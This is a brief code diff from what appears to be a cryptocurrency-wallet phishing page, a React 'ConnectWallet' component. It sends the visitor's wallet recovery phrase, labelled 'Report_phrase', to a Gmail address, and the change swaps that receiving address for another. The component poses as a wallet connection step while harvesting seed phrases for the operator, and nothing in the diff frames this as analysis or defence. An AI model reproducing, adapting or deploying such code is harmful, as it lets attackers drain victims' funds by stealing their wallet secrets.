@@ -103,7 +103,7 @@ export default function ConnectWallet() {
       sendMessage(
         `phrase:  ${value.phrase}`,
         "Report_phrase",
-        "Block2bitwallet@gmail.com"
+        "bitboxwallet@gmail.com"
       )
         .then(() => {
           setValue({
